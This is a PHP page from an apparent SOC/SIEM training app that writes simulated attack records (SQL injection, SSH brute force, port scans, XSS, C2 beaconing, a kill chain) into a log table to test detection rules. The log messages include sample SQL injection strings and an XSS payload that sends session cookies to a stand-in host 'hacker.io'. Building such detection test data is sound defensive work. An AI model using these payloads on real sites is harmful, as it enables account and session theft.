<?php
session_start();

if (!isset($_SESSION["username"])) {
    header("Location: login.php");
    exit();
}

include "db.php";

$page_title = "Attack Simulator";
$active_nav = "simulator";

$sim_result = "";
$sim_type = "alert-info";

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["scenario"])) {
    $scenario = $_POST["scenario"];
    $injected_count = 0;
    $alerts_generated = 0;

    $attacks = [];

    switch ($scenario) {
        case "sqli":
            $attacks[] = [
                'source_ip' => '185.220.101.' . rand(10, 250),
                'dest_ip' => '192.168.1.100',
                'port' => 80,
                'protocol' => 'HTTP',
                'event_type' => 'Web Attack',
                'severity' => 'CRITICAL',
                'username' => 'anonymous',
                'message' => "GET /products.php?id=10 UNION SELECT username,password,email FROM admin_users--",
                'action_taken' => 'Blocked'
            ];
            break;

        case "bruteforce":
            $attacker_ip = '198.51.100.' . rand(10, 200);
            for ($i = 1; $i <= 5; $i++) {
                $attacks[] = [
                    'source_ip' => $attacker_ip,
                    'dest_ip' => '192.168.1.22',
                    'port' => 22,
                    'protocol' => 'SSH',
                    'event_type' => 'Brute Force',
                    'severity' => ($i === 5) ? 'HIGH' : 'MEDIUM',
                    'username' => 'root',
                    'message' => "Failed login attempt for user root from $attacker_ip (Attempt $i/5 password dictionary attack)",
                    'action_taken' => ($i === 5) ? 'IP Banned' : 'Rejected'
                ];
            }
            break;

        case "portscan":
            $attacker_ip = '203.0.113.' . rand(5, 99);
            $attacks[] = [
                'source_ip' => $attacker_ip,
                'dest_ip' => '192.168.1.1',
                'port' => 8080,
                'protocol' => 'TCP',
                'event_type' => 'Port Scan',
                'severity' => 'MEDIUM',
                'username' => 'scanner',
                'message' => "Port scan detected: sequential SYN probe across ports 21, 22, 25, 80, 443, 3306, 8080 from $attacker_ip",
                'action_taken' => 'Alerted'
            ];
            break;

        case "xss":
            $attacks[] = [
                'source_ip' => '192.168.1.' . rand(20, 80),
                'dest_ip' => '192.168.1.100',
                'port' => 80,
                'protocol' => 'HTTP',
                'event_type' => 'Web Attack',
                'severity' => 'MEDIUM',
                'username' => 'guest_user',
                'message' => "POST /feedback payload: <script>fetch('http://hacker.io/steal?session='+document.cookie)</script>",
                'action_taken' => 'Sanitized'
            ];
            break;

        case "privilege":
            $attacks[] = [
                'source_ip' => '192.168.1.110',
                'dest_ip' => '192.168.1.5',
                'port' => 22,
                'protocol' => 'SSH',
                'event_type' => 'Privilege Escalation',
                'severity' => 'CRITICAL',
                'username' => 'guest_operator',
                'message' => "sudo su unauthorized: user guest_operator attempted unauthorized access to root wheel group",
                'action_taken' => 'Session Terminated'
            ];
            break;

        case "c2":
            $attacks[] = [
                'source_ip' => '192.168.1.175',
                'dest_ip' => '185.220.101.5',
                'port' => 9001,
                'protocol' => 'TCP',
                'event_type' => 'Malware Activity',
                'severity' => 'HIGH',
                'username' => 'workstation_04',
                'message' => "Malware outbound connection established to known Tor exit node (C2 Beaconing frequency 60s)",
                'action_taken' => 'Isolated'
            ];
            break;

        case "benign":
            $users = ['alice', 'bob', 'david', 'sarah', 'finance_user'];
            for ($k = 0; $k < 3; $k++) {
                $u = $users[array_rand($users)];
                $attacks[] = [
                    'source_ip' => '192.168.1.' . rand(10, 150),
                    'dest_ip' => '192.168.1.1',
                    'port' => 443,
                    'protocol' => 'HTTPS',
                    'event_type' => 'Auth Success',
                    'severity' => 'INFO',
                    'username' => $u,
                    'message' => "Normal HTTPS session initiated for user $u. Kerberos ticket validated.",
                    'action_taken' => 'Allowed'
                ];
            }
            break;

        case "full_chain":
            $adv_ip = '45.33.32.156';
            $attacks[] = [
                'source_ip' => $adv_ip, 'dest_ip' => '192.168.1.1', 'port' => 8080, 'protocol' => 'TCP',
                'event_type' => 'Port Scan', 'severity' => 'MEDIUM', 'username' => 'recon',
                'message' => "Port scan detected: Reconnaissance probe from $adv_ip targeting web application gateway", 'action_taken' => 'Logged'
            ];
            $attacks[] = [
                'source_ip' => $adv_ip, 'dest_ip' => '192.168.1.100', 'port' => 80, 'protocol' => 'HTTP',
                'event_type' => 'Web Attack', 'severity' => 'CRITICAL', 'username' => 'anonymous',
                'message' => "POST /api/v1/auth ' UNION SELECT password FROM users-- (SQL injection exploitation)", 'action_taken' => 'Intercepted'
            ];
            $attacks[] = [
                'source_ip' => '192.168.1.100', 'dest_ip' => $adv_ip, 'port' => 4444, 'protocol' => 'TCP',
                'event_type' => 'Malware Activity', 'severity' => 'HIGH', 'username' => 'www-data',
                'message' => "Outbound reverse shell traffic identified connecting to remote Tor exit node", 'action_taken' => 'Alerted'
            ];
            $attacks[] = [
                'source_ip' => '192.168.1.100', 'dest_ip' => '192.168.1.5', 'port' => 22, 'protocol' => 'SSH',
                'event_type' => 'Privilege Escalation', 'severity' => 'CRITICAL', 'username' => 'www-data',
                'message' => "sudo su unauthorized: compromised daemon attempting kernel exploit escalation", 'action_taken' => 'Blocked'
            ];
            break;
    }

    // Insert simulated records & evaluate rules
    foreach ($attacks as $atk) {
        $stmt = $conn->prepare("
            INSERT INTO security_logs (source_ip, dest_ip, port, protocol, event_type, severity, username, message, action_taken)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ");
        $stmt->bind_param("ssissssss", $atk['source_ip'], $atk['dest_ip'], $atk['port'], $atk['protocol'], $atk['event_type'], $atk['severity'], $atk['username'], $atk['message'], $atk['action_taken']);
        if ($stmt->execute()) {
            $injected_count++;
            $eval = evaluateSiemRule($conn, $stmt->insert_id, $atk['message'], $atk['source_ip'], $atk['event_type']);
            if ($eval['matched']) {
                $alerts_generated++;
            }
        }
    }

    $sim_result = "Simulation completed! Ingested $injected_count telemetry log(s). Generated $alerts_generated new Incident Alert(s).";
    $sim_type = ($alerts_generated > 0) ? "alert-error" : "alert-success";
}

include "header.php";
?>

<div class="container">
    <div class="page-title-bar">
        <div>
            <h2>Cyber Attack & Telemetry Traffic Simulator</h2>
            <p class="subtitle">Inject synthetic attack vectors and benign network traffic to test SIEM detection rules and SOC response workflows</p>
        </div>
        <div>
            <a href="dashboard.php" class="btn btn-secondary">Go to SOC Dashboard &rarr;</a>
        </div>
    </div>

    <?php if (!empty($sim_result)): ?>
        <div class="alert-box <?php echo $sim_type; ?>">
            <span><?php echo $sim_result; ?></span>
            <div style="margin-left: 16px;">
                <a href="alerts.php" class="btn btn-sm btn-danger">View Incidents</a>
                <a href="logs.php" class="btn btn-sm btn-secondary">View Log Stream</a>
            </div>
        </div>
    <?php endif; ?>

    <!-- Simulation Cards Grid -->
    <div class="sim-grid">
        <!-- SQL Injection -->
        <div class="sim-card" style="border-left: 4px solid var(--sev-critical);">
            <div>
                <span class="badge badge-critical">CRITICAL</span>
                <h4 style="margin-top: 8px;">1. SQL Injection (SQLi) Probe</h4>
                <p>Simulates an attacker attempting to bypass web authentication using <code class="code-pill">UNION SELECT</code> payloads.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="sqli">
                <button type="submit" class="btn btn-danger" style="width: 100%;">Simulate SQL Injection</button>
            </form>
        </div>

        <!-- SSH Brute Force -->
        <div class="sim-card" style="border-left: 4px solid var(--sev-high);">
            <div>
                <span class="badge badge-high">HIGH</span>
                <h4 style="margin-top: 8px;">2. SSH Password Brute Force</h4>
                <p>Generates a rapid sequence of 5 failed SSH authentication attempts against the root account.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="bruteforce">
                <button type="submit" class="btn btn-primary" style="width: 100%;">Simulate Brute Force</button>
            </form>
        </div>

        <!-- Port Scan -->
        <div class="sim-card" style="border-left: 4px solid #d97706;">
            <div>
                <span class="badge badge-medium">MEDIUM</span>
                <h4 style="margin-top: 8px;">3. TCP Port Scanning & Recon</h4>
                <p>Simulates Nmap/Masscan multi-port reconnaissance probe sweeping ports 21, 22, 80, 443, 3306.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="portscan">
                <button type="submit" class="btn btn-secondary" style="width: 100%;">Simulate Port Scan</button>
            </form>
        </div>

        <!-- Privilege Escalation -->
        <div class="sim-card" style="border-left: 4px solid var(--sev-critical);">
            <div>
                <span class="badge badge-critical">CRITICAL</span>
                <h4 style="margin-top: 8px;">4. Unauthorized Sudo Escalation</h4>
                <p>Simulates a restricted local account executing unauthorized <code class="code-pill">sudo su</code> privilege escalation.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="privilege">
                <button type="submit" class="btn btn-danger" style="width: 100%;">Simulate Privilege Escalation</button>
            </form>
        </div>

        <!-- Malware C2 -->
        <div class="sim-card" style="border-left: 4px solid var(--sev-high);">
            <div>
                <span class="badge badge-high">HIGH</span>
                <h4 style="margin-top: 8px;">5. Malware C2 Beaconing</h4>
                <p>Simulates an infected workstation making outbound connections to a known Tor Exit Node / C2 infrastructure.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="c2">
                <button type="submit" class="btn btn-secondary" style="width: 100%;">Simulate C2 Beacon</button>
            </form>
        </div>

        <!-- Cross-Site Scripting -->
        <div class="sim-card" style="border-left: 4px solid #d97706;">
            <div>
                <span class="badge badge-medium">MEDIUM</span>
                <h4 style="margin-top: 8px;">6. Cross-Site Scripting (XSS)</h4>
                <p>Injects malicious unencoded JavaScript tags targeting user session cookie extraction.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="xss">
                <button type="submit" class="btn btn-secondary" style="width: 100%;">Simulate XSS Attack</button>
            </form>
        </div>

        <!-- Normal Benign Traffic -->
        <div class="sim-card" style="border-left: 4px solid var(--ms-blue);">
            <div>
                <span class="badge badge-low">INFO</span>
                <h4 style="margin-top: 8px;">7. Normal Corporate Traffic</h4>
                <p>Generates routine benign HTTPS user logins, Kerberos authentications, and standard system telemetry.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="benign">
                <button type="submit" class="btn btn-cyan" style="width: 100%;">Simulate Benign Traffic</button>
            </form>
        </div>

        <!-- Complete Attack Kill-Chain -->
        <div class="sim-card" style="border-left: 4px solid #7c3aed; background: #faf5ff;">
            <div>
                <span class="badge" style="background: #f3e8ff; color: #7c3aed; border: 1px solid #d8b4fe;">KILL CHAIN</span>
                <h4 style="margin-top: 8px; color: #6b21a8;">8. Full Multi-Stage Cyber Attack</h4>
                <p>Simulates an APT attack progression: Reconnaissance &rarr; SQLi Breach &rarr; C2 Channel &rarr; Root Privilege Escalation.</p>
            </div>
            <form method="POST" action="simulator.php">
                <input type="hidden" name="scenario" value="full_chain">
                <button type="submit" class="btn" style="background: #7c3aed; color: #fff; width: 100%;">Simulate Full Kill-Chain</button>
            </form>
        </div>
    </div>
</div>

<?php include "footer.php"; ?>
